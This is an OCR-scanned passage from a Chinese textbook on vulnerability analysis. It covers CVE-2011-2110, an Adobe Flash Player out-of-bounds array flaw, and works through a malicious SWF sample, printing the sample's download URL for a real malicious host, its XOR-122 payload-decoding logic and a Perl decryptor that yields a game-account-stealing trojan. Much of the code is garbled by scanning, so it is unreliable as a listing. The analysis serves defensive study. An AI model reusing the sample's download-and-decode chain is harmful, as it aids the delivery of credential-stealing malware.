图8-1数组越界示例程序输出结果
图8-2array数组的栈数据
如果越界访问距离过大，就可能导致访间到不可访间的内存，导致程序前溃，如图8-3所示。
---
## Page 382
第8章数组越界访问漏润分析363
图8-3因数组越界导致程序崩溃
8.3
CVE-2011-2110AdobeFlashPlayer数组越界访问漏洞
8.3.1
漏洞描述
2011年6月爆发
了—款Adobe Flash漏
洞，当时被频繁用于
网页挂马攻击，尤其
10.32%
$
是在韩国，受此漏洞
1.55%
9.
攻击的电脑数量最
多。由于Adobe Flash
Player存在一处数组
三
越界访问漏洞，导致
利用该漏洞可执行任
进
意代码。在10.3.181.26
版本之前各平台的
Adobe Flash PlayertS)
受影响，影响范围较
大。该漏洞被恶名昭
彰的Blackhole Exploit
Kit（“黑洞”漏洞攻
击包，如图8-4所示）
所使用，该工具包售
价1500美元，流传于
地下黑产。
图8-4Blackhole界面
---
## Page 383
364漏洞战争：软件漏洞分析精要
8.3.2
解决安装旧版FlashPlayer的限制问题
有时，当我们已经安装了较新版的Adobe Flash Player后，由于需要装回旧版Adobe Flash Player
用于漏洞分析，可能在安装过程中遇到如l图8-5所示的情况，导致无法装回旧版AdobeFlashPlayer。
安装程序在安装时会去注册表中检查该机器上普经安装过的最高版本，如果当前安装的版本比注册
表中写入的最高版本还低，就会发出警告并终止安装。
Ack
图8-5安装旧版FlashPlayer时出错
因此，通过修复注册表可解决此问题，打开注册表编辑器（“运行”中输入regedit），将[HKEY
LOCAL_MACHINE/SOFTWARE/Macromedia/FlashPlayer/SafeVersions]下高于你当前安装版本的项
删掉即可，如图8-6所示。
BRM0.
b0t+6001+ 050731
rdie
FlaolPlaye
 272
Setmf (429M963216)
.Sehey
RoNPy
erion
BOER
b (4294)6727)
181 (4294961279)
图8-6修改注册表
这里将注册表中的10.0与11.0这两个项删除之后，重新运行安装程序即可成功安装，如图8-7
所示。
---
## Page 384
第8章数组越界访问漏洞分析365
图8-7成功安装旧版FlashPlayer
8.3.3通过Perl脚本辅助分析样本
样本主要通过HTML网页加载触发漏洞的swf文件，HTML代码如下：
test
_aTAou_=aweu weued>
value=*main,swf?info=82e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51
d3527b7ab7387656" />
s,=auuweed>
---
## Page 385
366漏洞战争：软件漏洞分析精要
-->
--)
上面的代码主要是加载main.swf文件，并传递info参数，上面3处main.swf都是传递相同的info参
数（关于info参数的含义后面会有所分析），主要针对IE和非IE两个版本来设置，因此实际上它只会
---
## Page 386
第8章数组越界访问漏润分析4367
加载一次main.swf文件：
接下米，用JPEXSFreeFlashDecompiler反编译main.swf文件，反编译代码有600多行，我们首先
找到info参数的用途。在JPEXS中按“Curl+F”组合键搜索“info”，找到如图8-8所示的代码。
39
ver pern:Objet s root. 1oaderInfe. permeters:
40
rer url:Bytserey = this. bxlin(permisf°]):
4
I = 0:
42
i = 0;
43
bi1+G  0 1I lrorser. taLererCase 0.ia
54
55
ress O
54
57
58
$9
gressO:
60
61
62
63
agress 0:
64
图8-10SWF反编译代码
be Flash Player 20
发生
全部电AD
续口
图8-11解压缩数据时弹出的错误框
继续往后看反编译代码，样本会去下载http://www.amcia.info/down/cd.txt文件，同时设置监听函
数onLoadComplete，如图8-12所示。
65
var ur1_str:5tring * string(t_ur1)
66.
loeder + nte URLLoadee();
67.
loader-dataForsat • uRLLeaderoataFoneat-8DRY;
loader asdEventListener(Event,CoNPLETE,onLsadoeplete)}
leader-1ead(sew UtLRequest[t_uel,te5tring[3]]s
11下肌那码的采的c.tt文作
图8-12设置页面加载完成后的监听函数
---
## Page 388
第8章数组越界访问漏润分析369
监听函数onLoadComplete主要是下载cd.txt，并将其与122进行异或解密，最后再调用test函数利
用漏洞做进一步攻击，如图8-13所示。
11.
19
oadCoaplete * function(parant:Event)rvaie
// 获影.tt文界内容
1 - 8;
23.
24.
1+*}
27
28
var _1iec2_Bytekrray • sev ByteArnay(3s
centent_1en * centent -1ength;
21.
code + _1ec2_:
- 1824 * 1824;
// 8x2e0eee
13,
_lec2_-er1te1nt(2853274210);
f/ ec7A627A52
_lec2_-write1nt(28s3339747)
_1oc2_,writent(cesss3);
J/ ex2A637M3
15
H4
_lec2_,writeoeet_1ac3_)
1/ 0x746474)
36.
37,
trace(_1oc2_-1ength);
38.
-8
异或解密下载的文件
对于cd.txt的解密，我们仍然可以使用Perl脚本来完成，解密代码如下：
#1/usr/local/bin/per1
use strict;
use Compress::Z11b;
my $decode_str = "";
my $str = *";
open（FILE，‘C：\Users\Administrator\Desktop\cd.txt'）1|die（“打开文件失败！\n"）;
while(){
$str = s_;
close FILE;
while($str =~ /(- 1\n|[ex8e-8xff])/g){
$decode_str.=chr(ord($1)^122);
open（DECoDE_FILE，“>decode_file.bin"）11die（“创建文件失败！\n）;
---
## Page 389
370漏洞战争：软件漏洞分析精要
print DECODE_FILE
uncompress($decode_str);
close DECODE_FILE;
解密后用十六进制编辑器查看解密出来的decode_file.bin文件，可以发现这是一个PE可执行程
序，如图8-14所示。
ee_til.hi8
054900000000:00:04000000:10000
001Da:
韩品品088888888888
39 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00
coro....
0040
99H162100110262H00201841 30
图8-14 decode_file.bin文件
我们将decode_file.bin重命为decode_file.exe，然后上传到金山火眼进行自动化行为分析，得到如
图8-15所示的结果，可以看到这是个游戏盗号木马。